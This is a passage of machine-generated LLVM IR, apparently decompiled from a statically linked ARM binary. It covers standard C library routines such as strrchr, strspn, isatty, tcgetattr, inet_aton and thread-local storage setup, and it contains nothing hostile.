  %v2_15f00 = call i32 @__GI_strchr(i32 %v0_15f1813, i32 %v3_15f1014)
  %v2_15f04 = icmp eq i32 %v2_15f00, 0
  %v0_15f0c = load i32, i32* @r5, align 4
  br i1 %v2_15f04, label %dec_label_pc_15f0c, label %dec_label_pc_15f24

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15f00
  %v1_15f0c = add i32 %v0_15f0c, 1
  %v0_15f10.pre = load i32, i32* @r4, align 4
  %v0_15f18.pre = load i32, i32* @r6, align 4
  store i32 %v1_15f0c, i32* @r5, align 4
  %v1_15f10 = inttoptr i32 %v0_15f10.pre to i8*
  %v2_15f10 = load i8, i8* %v1_15f10, align 1
  %v3_15f10 = zext i8 %v2_15f10 to i32
  store i32 %v3_15f10, i32* @r1, align 4
  %v2_15f14 = icmp eq i8 %v2_15f10, 0
  store i32 %v0_15f18.pre, i32* @r0, align 4
  %v1_15f1c = add i32 %v0_15f10.pre, 1
  store i32 %v1_15f1c, i32* @r4, align 4
  br i1 %v2_15f14, label %dec_label_pc_15f24, label %dec_label_pc_15f00

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15f0c, %dec_label_pc_15f00, %entry
  %v0_15f24 = phi i32 [ 0, %entry ], [ %v0_15f0c, %dec_label_pc_15f00 ], [ %v1_15f0c, %dec_label_pc_15f0c ]
  %v2_15f28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15f28, i32* @r4, align 4
  store i32 %v6_15eec, i32* @r5, align 4
  store i32 %v9_15eec, i32* @r6, align 4
  ret i32 %v0_15f24

; uselistorder directives
  uselistorder i32 %v3_15f10, { 1, 0 }
  uselistorder i32 %v0_15f18.pre, { 1, 0 }
  uselistorder i32 %v0_15f10.pre, { 1, 0 }
  uselistorder label %dec_label_pc_15f00, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_15f34 = urem i32 %arg2, 256
  store i32 %v1_15f34, i32* @r4, align 4
  %v2_15f34 = icmp eq i32 %v1_15f34, 0
  br i1 %v2_15f34, label %dec_label_pc_15f48, label %dec_label_pc_15f5c.preheader

dec_label_pc_15f5c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_15f643 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_15f34)
  %v2_15f685 = icmp eq i32 %v2_15f643, 0
  br i1 %v2_15f685, label %dec_label_pc_15f70, label %dec_label_pc_15f54

dec_label_pc_15f48:                               ; preds = %entry
  %v2_15f4c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_15f74

dec_label_pc_15f54:                               ; preds = %dec_label_pc_15f5c.preheader, %dec_label_pc_15f54
  %v2_15f646 = phi i32 [ %v2_15f64, %dec_label_pc_15f54 ], [ %v2_15f643, %dec_label_pc_15f5c.preheader ]
  store i32 %v2_15f646, i32* @r5, align 4
  %v1_15f58 = add i32 %v2_15f646, 1
  store i32 %v1_15f58, i32* @r0, align 4
  %v0_15f60 = load i32, i32* @r4, align 4
  %v2_15f64 = call i32 @__GI_strchr(i32 %v1_15f58, i32 %v0_15f60)
  %v2_15f68 = icmp eq i32 %v2_15f64, 0
  br i1 %v2_15f68, label %dec_label_pc_15f70, label %dec_label_pc_15f54

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f54, %dec_label_pc_15f5c.preheader
  %v0_15f70 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f74

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f70
  %storemerge = phi i32 [ %v2_15f4c, %dec_label_pc_15f48 ], [ %v0_15f70, %dec_label_pc_15f70 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15f64, { 1, 0 }
  uselistorder i32 %v1_15f58, { 1, 0 }
  uselistorder i32 %v1_15f34, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15f74, { 1, 0 }
  uselistorder label %dec_label_pc_15f54, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_15fb02 = load i32, i32* @r0, align 4
  %v1_15fb03 = inttoptr i32 %v0_15fb02 to i8*
  %v2_15fb04 = load i8, i8* %v1_15fb03, align 1
  %v2_15fb46 = icmp eq i8 %v2_15fb04, 0
  br i1 %v2_15fb46, label %dec_label_pc_15fc0, label %dec_label_pc_15f94.preheader

dec_label_pc_15f8c:                               ; preds = %dec_label_pc_15f94
  %v1_15f9c = add i32 %v0_15f9c, 1
  %v9_15f8c = icmp eq i8 %v0_15f8c10.in, %v2_15f94
  br i1 %v9_15f8c, label %dec_label_pc_15fa8, label %dec_label_pc_15f94

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f94.preheader, %dec_label_pc_15f8c
  %v0_15f9c = phi i32 [ %tmp, %dec_label_pc_15f94.preheader ], [ %v1_15f9c, %dec_label_pc_15f8c ]
  %v1_15f94 = inttoptr i32 %v0_15f9c to i8*
  %v2_15f94 = load i8, i8* %v1_15f94, align 1
  %v2_15f98 = icmp eq i8 %v2_15f94, 0
  br i1 %v2_15f98, label %dec_label_pc_15fc0, label %dec_label_pc_15f8c

dec_label_pc_15fa8:                               ; preds = %dec_label_pc_15f8c
  %v1_15fa8 = add i32 %v0_15fa8, 1
  %v1_15fac = add i32 %v0_15fac, 1
  %v1_15fb0 = inttoptr i32 %v1_15fac to i8*
  %v2_15fb0 = load i8, i8* %v1_15fb0, align 1
  %v2_15fb4 = icmp eq i8 %v2_15fb0, 0
  br i1 %v2_15fb4, label %dec_label_pc_15fc0, label %dec_label_pc_15f94.preheader

dec_label_pc_15f94.preheader:                     ; preds = %entry, %dec_label_pc_15fa8
  %v0_15fac = phi i32 [ %v1_15fac, %dec_label_pc_15fa8 ], [ %v0_15fb02, %entry ]
  %v0_15fa8 = phi i32 [ %v1_15fa8, %dec_label_pc_15fa8 ], [ 0, %entry ]
  %v0_15f8c10.in = phi i8 [ %v2_15fb0, %dec_label_pc_15fa8 ], [ %v2_15fb04, %entry ]
  br label %dec_label_pc_15f94

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15fa8, %dec_label_pc_15f94, %entry
  %v0_15fc0 = phi i32 [ 0, %entry ], [ %v0_15fa8, %dec_label_pc_15f94 ], [ %v1_15fa8, %dec_label_pc_15fa8 ]
  ret i32 %v0_15fc0

; uselistorder directives
  uselistorder i8 %v2_15f94, { 1, 0 }
  uselistorder i32 %v0_15f9c, { 1, 0 }
  uselistorder label %dec_label_pc_15f94.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15fd4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15fd4, i32* @r1, align 4
  %v0_15fd8 = call i32 @__GI_tcgetattr()
  %v1_15fdc = sub i32 1, %v0_15fd8
  %v2_15fdc = icmp ult i32 %v0_15fd8, 2
  br i1 %v2_15fdc, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_15fec = phi i32 [ %v1_15fdc, %entry ], [ 0, %bb ]
  ret i32 %v1_15fec

; uselistorder directives
  uselistorder i32 %v0_15fd8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15ff0 = load i32, i32* @r4, align 4
  %v6_15ff0 = load i32, i32* @r5, align 4
  %v9_15ff0 = load i32, i32* @r6, align 4
  %v2_15ff8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_15ffc = load i32, i32* @r1, align 4
  store i32 %v0_15ffc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_16008 = load i32, i32* @r0, align 4
  %v3_16008 = call i32 @ioctl(i32 %v0_16008, i32 21505, i32 %v2_15ff8)
  store i32 %v3_16008, i32* %r0.global-to-local, align 4
  store i32 %v3_16008, i32* @r5, align 4
  %v2_1600c = icmp eq i32 %v3_16008, 0
  br i1 %v2_1600c, label %dec_label_pc_16014, label %dec_label_pc_16058

dec_label_pc_16014:                               ; preds = %entry
  %v4_16020 = zext i8 %tmp to i32
  store i32 %v4_16020, i32* @ip, align 4
  %v3_16024 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_16024, i32* @r3, align 4
  %v1_16028 = load i32, i32* @r4, align 4
  %v2_16028 = add i32 %v1_16028, 4
  %v3_16028 = inttoptr i32 %v2_16028 to i32*
  %v0_1602c = load i32, i32* %r1.global-to-local, align 4
  %v1_1602c = load i32, i32* @r4, align 4
  %v2_1602c = add i32 %v1_1602c, 8
  %v3_1602c = inttoptr i32 %v2_1602c to i32*
  store i32 %v0_1602c, i32* %v3_1602c, align 4
  %v0_16030 = load i32, i32* %r0.global-to-local, align 4
  %v1_16030 = load i32, i32* @r4, align 4
  %v2_16030 = add i32 %v1_16030, 12
  %v3_16030 = inttoptr i32 %v2_16030 to i32*
  store i32 %v0_16030, i32* %v3_16030, align 4
  %v2_16034 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_16034, i32* @r1, align 4
  %v1_1603c = load i32, i32* @r4, align 4
  %v2_1603c = inttoptr i32 %v1_1603c to i32*
  store i32 %v3_16024, i32* %v2_1603c, align 4
  %v0_16040 = load i32, i32* @ip, align 4
  %v1_16040 = trunc i32 %v0_16040 to i8
  %v2_16040 = load i32, i32* @r4, align 4
  %v3_16040 = add i32 %v2_16040, 16
  %v4_16040 = inttoptr i32 %v3_16040 to i8*
  store i8 %v1_16040, i8* %v4_16040, align 1
  %v0_16044 = load i32, i32* @r4, align 4
  %v1_16044 = add i32 %v0_16044, 17
  store i32 %v1_16044, i32* %r0.global-to-local, align 4
  %v4_16048 = call i32 @__GI_mempcpy(i32 %v1_16044, i32 %v2_16034, i32 19, i32 %v3_16024)
  store i32 %v4_16048, i32* %r0.global-to-local, align 4
  %v0_1604c = load i32, i32* @r5, align 4
  store i32 %v0_1604c, i32* %r1.global-to-local, align 4
  %v3_16054 = inttoptr i32 %v4_16048 to i8*
  %v4_16054 = call i32 @__GI_memset(i8* %v3_16054, i32 %v0_1604c, i32 13)
  store i32 %v4_16054, i32* %r0.global-to-local, align 4
  %v0_16058.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16058

dec_label_pc_16058:                               ; preds = %entry, %dec_label_pc_16014
  %v0_16058 = phi i32 [ %v3_16008, %entry ], [ %v0_16058.pre, %dec_label_pc_16014 ]
  store i32 %v0_16058, i32* %r0.global-to-local, align 4
  store i32 %v3_15ff0, i32* @r4, align 4
  store i32 %v6_15ff0, i32* @r5, align 4
  store i32 %v9_15ff0, i32* @r6, align 4
  ret i32 %v0_16058

; uselistorder directives
  uselistorder i32 %v0_16058, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 13, 1, 2, 14, 15, 3, 4, 5, 6, 16, 7, 17, 8, 18, 19, 20, 9, 21, 10, 11, 22, 12, 23, 24, 25, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16058, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1606c = load i32, i32* @r4, align 4
  store i32 %v3_1606c, i32* %stack_var_-28, align 4
  %v0_16074 = load i32, i32* @r0, align 4
  %v2_16074 = icmp eq i32 %v0_16074, 0
  %v0_1607c = load i32, i32* @r1, align 4
  br i1 %v2_16074, label %dec_label_pc_16150, label %dec_label_pc_16084

dec_label_pc_16084:                               ; preds = %entry
  br label %dec_label_pc_1609c

dec_label_pc_1609c:                               ; preds = %dec_label_pc_16084, %dec_label_pc_16114
  %v1_16114 = phi i32 [ 0, %dec_label_pc_16084 ], [ %v5_16114, %dec_label_pc_16114 ]
  %v0_16118 = phi i32 [ 1, %dec_label_pc_16084 ], [ %v1_16118, %dec_label_pc_16114 ]
  %v0_1609c = phi i32 [ %v0_16074, %dec_label_pc_16084 ], [ %v0_1609c13, %dec_label_pc_16114 ]
  %v1_1609c = inttoptr i32 %v0_1609c to i8*
  %v2_1609c = load i8, i8* %v1_1609c, align 1
  %v3_1609c = zext i8 %v2_1609c to i32
  %v4_160a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 276) to i32*), align 4
  %v2_160a4 = mul nuw nsw i32 %v3_1609c, 2
  %v2_160a8 = add i32 %v2_160a4, %v4_160a0
  %v3_160a8 = inttoptr i32 %v2_160a8 to i16*
  %v4_160a8 = load i16, i16* %v3_160a8, align 2
  %v1_160ac = and i16 %v4_160a8, 8
  %v2_160ac = icmp eq i16 %v1_160ac, 0
  br i1 %v2_160ac, label %dec_label_pc_16150, label %dec_label_pc_160b4

dec_label_pc_160b4:                               ; preds = %dec_label_pc_1609c
  br label %dec_label_pc_160d4

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160d4
  %v2_160bc = mul i32 %v0_16114, 10
  %v1_160c0 = add i32 %v2_160bc, -48
  %v2_160c4 = add i32 %v3_160d4, %v1_160c0
  %v8_160cc = icmp sgt i32 %v2_160c4, 255
  br i1 %v8_160cc, label %dec_label_pc_16150, label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160bc
  %v1_160d0 = add i32 %v0_16104, 1
  store i32 %v1_160d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160d4

dec_label_pc_160d4:                               ; preds = %dec_label_pc_160b4, %dec_label_pc_160d0
  %v0_16114 = phi i32 [ 0, %dec_label_pc_160b4 ], [ %v2_160c4, %dec_label_pc_160d0 ]
  %v0_16104 = phi i32 [ %v0_1609c, %dec_label_pc_160b4 ], [ %v1_160d0, %dec_label_pc_160d0 ]
  %v1_160d4 = inttoptr i32 %v0_16104 to i8*
  %v2_160d4 = load i8, i8* %v1_160d4, align 1
  %v3_160d4 = zext i8 %v2_160d4 to i32
  %v2_160d8 = mul nuw nsw i32 %v3_160d4, 2
  %v2_160dc = add i32 %v2_160d8, %v4_160a0
  %v3_160dc = inttoptr i32 %v2_160dc to i16*
  %v4_160dc = load i16, i16* %v3_160dc, align 2
  %v6_160dc = zext i16 %v4_160dc to i32
  %v1_160e0 = and i32 %v6_160dc, 8
  %v2_160e0 = icmp eq i32 %v1_160e0, 0
  br i1 %v2_160e0, label %dec_label_pc_160e8, label %dec_label_pc_160bc

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160d4
  %v7_160e8 = icmp eq i32 %v0_16118, 4
  br i1 %v7_160e8, label %dec_label_pc_16100, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160e8
  %v7_160f0 = icmp eq i8 %v2_160d4, 46
  br i1 %v7_160f0, label %dec_label_pc_160f8, label %dec_label_pc_16150

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160f0
  %v1_160f8 = add i32 %v0_16104, 1
  store i32 %v1_160f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16114

dec_label_pc_16100:                               ; preds = %dec_label_pc_160e8
  %v2_16100 = icmp eq i8 %v2_160d4, 0
  %v1_16104 = add i32 %v0_16104, 1
  store i32 %v1_16104, i32* %r0.global-to-local, align 4
  br i1 %v2_16100, label %dec_label_pc_16114, label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16100
  %v1_1610c = and i32 %v6_160dc, 32
  %v2_1610c = icmp eq i32 %v1_1610c, 0
  br i1 %v2_1610c, label %dec_label_pc_16150, label %dec_label_pc_16114

dec_label_pc_16114:                               ; preds = %dec_label_pc_1610c, %dec_label_pc_16100, %dec_label_pc_160f8
  %v0_1609c13 = phi i32 [ %v1_16104, %dec_label_pc_1610c ], [ %v1_16104, %dec_label_pc_16100 ], [ %v1_160f8, %dec_label_pc_160f8 ]
  %v4_16114 = mul i32 %v1_16114, 256
  %v5_16114 = or i32 %v0_16114, %v4_16114
  %v1_16118 = add nuw nsw i32 %v0_16118, 1
  %v7_16120 = icmp slt i32 %v1_16118, 5
  br i1 %v7_16120, label %dec_label_pc_1609c, label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_16114
  %v2_16124 = icmp eq i32 %v0_1607c, 0
  br i1 %v2_16124, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_16124
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16154

bb:                                               ; preds = %dec_label_pc_16124
  %v4_16128 = udiv i32 %v5_16114, 16777216
  %v2_1612c = udiv i32 %v5_16114, 256
  %v5_16130 = and i32 %v2_1612c, 65280
  %v2_16134 = and i32 %v5_16114, 65280
  %v5_16138 = mul nuw nsw i32 %v2_16134, 256
  %v5_1613c = mul i32 %v0_16114, 16777216
  %v6_16130 = or i32 %v4_16128, %v5_1613c
  %v6_16138 = or i32 %v6_16130, %v5_16130
  %v6_1613c = or i32 %v6_16138, %v5_16138
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_16148 = inttoptr i32 %v0_1607c to i32*
  store i32 %v6_1613c, i32* %v3_16148, align 4
  %v2_16154.pre = load i32, i32* %stack_var_-28, align 4
  %v1_16158.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16150:                               ; preds = %dec_label_pc_160f0, %dec_label_pc_1610c, %dec_label_pc_1609c, %dec_label_pc_160bc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16154:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_16150
  %v1_16158 = phi i32 [ %v1_16158.pre, %bb ], [ 0, %dec_label_pc_16150 ], [ 1, %.thread8.thread ]
  %v2_16154 = phi i32 [ %v2_16154.pre, %bb ], [ %v3_1606c, %dec_label_pc_16150 ], [ %v3_1606c, %.thread8.thread ]
  store i32 %v2_16154, i32* @r4, align 4
  ret i32 %v1_16158

; uselistorder directives
  uselistorder i32 %v1_16118, { 1, 0 }
  uselistorder i32 %v5_16114, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16104, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 65, 0, 6, 1, 2, 7, 8, 9, 10, 11, 37, 45, 46, 47, 12, 13, 14, 48, 49, 15, 16, 17, 18, 38, 50, 3, 4, 51, 52, 19, 20, 39, 53, 54, 40, 21, 22, 23, 24, 25, 55, 56, 57, 58, 41, 42, 43, 5, 59, 60, 26, 61, 27, 28, 29, 30, 44, 62, 31, 32, 33, 63, 34, 35, 36, 64 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 7, 9, 8, 10, 6, 11, 3 }
  uselistorder i16 0, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_16154, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16150, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_160d4, { 1, 0 }
  uselistorder label %dec_label_pc_1609c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_16170 = load i32, i32* @r4, align 4
  store i32 %v3_16170, i32* %stack_var_-16, align 4
  %v4_16174 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1617c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16184 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 36) to i32*), align 4
  store i32 %v4_16184, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1618c = inttoptr i32 %v4_16174 to i32*
  %v2_1618c = load i32, i32* %v1_1618c, align 4
  %v4_16190 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 52) to i32*), align 4
  store i32 %v4_16190, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_16198 = add i32 %v2_1618c, 15
  %v4_1619c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 144) to i32*), align 4
  store i32 %v4_1619c, i32* @ip, align 4
  %v1_161a0 = load i32, i32* @r0, align 4
  %v2_161a0 = add i32 %v1_161a0, %v1_16198
  %v1_161a4 = inttoptr i32 %v4_1617c to i32*
  %v2_161a4 = load i32, i32* %v1_161a4, align 4
  store i32 %v2_161a4, i32* %r3.global-to-local, align 4
  %v1_161a8 = and i32 %v2_161a0, -16
  store i32 %v1_161a8, i32* %v1_1618c, align 4
  %v0_161b0 = load i32, i32* @r0, align 4
  %v1_161b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_161b0 = inttoptr i32 %v1_161b0 to i32*
  store i32 %v0_161b0, i32* %v2_161b0, align 4
  %v0_161b4 = load i32, i32* @r1, align 4
  %v1_161b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_161b4 = inttoptr i32 %v1_161b4 to i32*
  store i32 %v0_161b4, i32* %v2_161b4, align 4
  %v0_161b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_161b8 = load i32, i32* @ip, align 4
  %v2_161b8 = inttoptr i32 %v1_161b8 to i32*
  store i32 %v0_161b8, i32* %v2_161b8, align 4
  %v2_161bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_161bc, i32* %r4.global-to-local, align 4
  %v1_161c0 = load i32, i32* @r0, align 4
  ret i32 %v1_161c0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_161c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_161c8:
  %v0_161c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_161c8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_161c8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_161c8, %bb
  %v4_161d8 = phi i32 [ %arg1, %dec_label_pc_161c8 ], [ 0, %bb ]
  ret i32 %v4_161d8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r3.global-to-local, align 4
  %v4_161ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 84) to i32*), align 4
  store i32 %v4_161ec, i32* @lr, align 4
  %v4_161f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 10744) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 10744), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_16218 = inttoptr i32 %v4_161f8 to i32*
  store i32 1, i32* %v2_16218, align 4
  %v0_1621c = load i32, i32* %r3.global-to-local, align 4
  %v1_1621c = load i32, i32* @lr, align 4
  %v2_1621c = inttoptr i32 %v1_1621c to i32*
  store i32 %v0_1621c, i32* %v2_1621c, align 4
  %v0_16220 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_16238(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16238:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_16238 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16238, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16238
  %v2_16238 = load i32, i32* @r4, align 4
  %v8_16238 = ashr i32 %v2_16238, %tmp
  %v9_16238 = and i32 %v8_16238, %tmp
  %v2_1623c = load i32, i32* @ip, align 4
  %v8_1623c = lshr i32 %v2_1623c, %v9_16238
  %v9_1623c = and i32 %v8_1623c, %v9_16238
  store i32 %v9_1623c, i32* %r0.global-to-local, align 4
  %v4_16240 = inttoptr i32 %v9_1623c to i32*
  store i32 %arg2, i32* %v4_16240, align 4
  %v5_16240 = load i32, i32* @r8, align 4
  %v6_16240 = load i32, i32* %r0.global-to-local, align 4
  %v7_16240 = sub i32 %v6_16240, %v5_16240
  store i32 %v7_16240, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16238, %bb
  %v8_16240 = phi i32 [ %tmp, %dec_label_pc_16238 ], [ %v7_16240, %bb ]
  ret i32 %v8_16240

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1624c = call i32 @__aeabi_read_tp()
  %v1_16250 = inttoptr i32 %v0_1624c to i32*
  %v2_16250 = load i32, i32* %v1_16250, align 4
  %v1_16254 = add i32 %arg1, 4
  %v2_16254 = inttoptr i32 %v1_16254 to i32*
  %v3_16254 = load i32, i32* %v2_16254, align 4
  %v1_16258 = add i32 %v2_16250, 8
  %v2_16258 = inttoptr i32 %v1_16258 to i32*
  %v3_16258 = load i32, i32* %v2_16258, align 4
  %v2_1625c = add i32 %v3_16258, %v3_16254
  ret i32 %v2_1625c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16268 = load i32, i32* @r4, align 4
  store i32 %v3_16268, i32* %stack_var_-36, align 4
  %v6_16268 = load i32, i32* @r5, align 4
  %v15_16268 = load i32, i32* @r8, align 4
  %v18_16268 = load i32, i32* @sb, align 4
  %v21_16268 = load i32, i32* @sl, align 4
  %v24_16268 = load i32, i32* @fp, align 4
  %v27_16268 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %sl.global-to-local, align 4
  %v4_16278 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 104) to i32*), align 4
  store i32 %v4_16278, i32* %r3.global-to-local, align 4
  %v1_1627c = inttoptr i32 %v4_16278 to i32*
  %v2_1627c = load i32, i32* %v1_1627c, align 4
  store i32 %v2_1627c, i32* %r2.global-to-local, align 4
  %v2_16280 = icmp eq i32 %v2_1627c, 0
  %v0_16288 = load i32, i32* %r0.global-to-local, align 4
  %v0_1628c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1628c, i32* %ip.global-to-local, align 4
  br i1 %v2_16280, label %dec_label_pc_16454, label %dec_label_pc_16294

dec_label_pc_16294:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_16298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 156) to i32*), align 4
  store i32 %v4_16298, i32* @lr, align 4
  store i32 %v2_1627c, i32* %r1.global-to-local, align 4
  %v1_162e0 = inttoptr i32 %v4_16298 to i32*
  %v2_162e061 = load i32, i32* %v1_162e0, align 4
  %v4_162e462 = mul i32 %v2_162e061, 32
  %v5_162e463 = add i32 %v4_162e462, %v2_1627c
  store i32 %v5_162e463, i32* %r3.global-to-local, align 4
  %v3_162e865 = icmp ult i32 %v2_1627c, %v5_162e463
  br i1 %v3_162e865, label %dec_label_pc_162a4, label %dec_label_pc_16454.loopexit

dec_label_pc_162a4:                               ; preds = %dec_label_pc_16294, %dec_label_pc_162dc
  %v0_162bc66 = phi i32 [ %v1_162dc, %dec_label_pc_162dc ], [ %v2_1627c, %dec_label_pc_16294 ]
  %v1_162a4 = inttoptr i32 %v0_162bc66 to i32*
  %v2_162a4 = load i32, i32* %v1_162a4, align 4
